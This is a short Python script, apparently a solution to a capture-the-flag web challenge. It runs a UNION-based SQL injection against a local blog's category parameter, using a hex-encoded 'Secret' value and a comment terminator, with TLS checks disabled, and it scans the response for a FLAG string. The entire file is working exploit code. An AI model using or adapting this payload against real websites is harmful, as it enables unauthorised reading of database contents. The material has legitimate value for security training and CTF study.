print('Starting SQL injection test...')

# Target configuration
target_url = 'http://127.0.0.1:33130/?category='
secret_hex = '0x536563726574'  # Hex encoded 'Secret'
payload = f"NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category={secret_hex}--"

print(f'Payload: {payload}')

# URL encode
def url_encode(s):
    result = ''
    safe_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~'
    for c in s:
        if c in safe_chars:
            result += c
        else:
            result += f'%{ord(c):02X}'
    return result

encoded_payload = url_encode(payload)
full_url = target_url + encoded_payload

print(f'Full URL: {full_url}')
print('\nAttempting request...')

# Using urllib without timeout first
try:
    import urllib.request, urllib.parse, ssl
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    req = urllib.request.Request(full_url)
    response = urllib.request.urlopen(req, context=context)
    content = response.read().decode('utf-8', errors='ignore')
    
    print(f'\nStatus: {response.status}')
    print(f'Content Length: {len(content)}')
    print('\nResponse:')
    print('='*80)
    print(content)
    print('='*80)
    
    # Check results
    if 'Secret' in content:
        print('\n[✓] Found Secret category content!')
    else:
        print('\n[-] No Secret content found')
        
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', content)
    if flags:
        print(f'\n[!!!] FLAG: {flags[0]}')
    else:
        print('\n[-] No flag found')
        
except Exception as e:
    print(f'\n[!] Error: {e}')
    import traceback, sys
    exc_type, exc_value, exc_traceback = sys.exc_info()
    print(''.join(traceback.format_exception(exc_type, exc_value, exc_traceback)))
